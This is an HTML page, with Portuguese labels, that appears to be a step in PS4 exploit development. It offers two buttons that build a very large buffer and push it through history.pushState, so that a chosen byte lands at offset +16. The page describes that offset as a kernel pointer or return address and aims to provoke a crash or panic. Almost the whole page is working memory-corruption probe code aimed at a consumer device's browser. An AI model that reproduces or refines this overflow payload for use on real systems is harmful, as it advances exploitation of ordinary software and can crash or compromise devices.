<!DOCTYPE html>
<html>
<head>
    <title>PS4 Critical Offset +16</title>
    <style>
        body { background-color: #330000; color: #ff5555; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 22px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 90%; border: 3px solid #ff0000; background: #000; color: #fff; font-weight: bold;
        }
        .safe { border-color: #00ff00; color: #00ff00; }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: yellow; background: #111; }
    </style>
</head>
<body>

    <h1>Alvo: Offset +16 (Kernel Pointer)</h1>
    <p>Reinicie o console. Vamos testar se controlamos o destino.</p>

    <div id="log">Pronto.</div>

    <button class="safe" onclick="hitTarget(0x01)">
        1. Escrever 0x01 (Seguro)<br>
        <small>Deve SOBREVIVER (Mantém o fluxo)</small>
    </button>

    <button onclick="hitTarget(0x15)">
        2. Escrever 0x15 (Desvio)<br>
        <small>Muda o endereço de retorno. Crash ou Panic?</small>
    </button>

    <script>
        const BASE_OFFSET = 709522;
        const TARGET_OFFSET = 16; // O local do Panic

        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function hitTarget(byteVal) {
            log("Preparando injeção no Offset +" + TARGET_OFFSET + " com valor " + byteVal + "...");
            
            setTimeout(() => {
                try {
                    // 1. Base Segura
                    let buffer = "A".repeat(BASE_OFFSET);
                    
                    // 2. Preenche o túnel até chegar no +16 com '1' (neutro)
                    // Cria um array de 16 bytes com 0x01
                    let tunnel = new Array(TARGET_OFFSET).fill('\x01');
                    buffer += tunnel.join('');

                    // 3. O TIRO NO ALVO (+16)
                    // Inserimos o byte modificado
                    buffer += String.fromCharCode(byteVal);
                    
                    // 4. Preenche um pouco mais depois só pra garantir
                    buffer += "\x01".repeat(8);

                    // Dispara
                    history.pushState({}, "critical_test", "/" + buffer);
                    
                    log("Payload enviado. Aguardando reação...");
                    
                    if(byteVal === 0x01) {
                        document.body.style.backgroundColor = "#002200";
                        log("SUCESSO! Offset +16 aceita escrita segura.");
                    }

                } catch (e) {
                    log("Erro JS: " + e.message);
                }
            }, 1000);
        }
    </script>
</body>
</html>
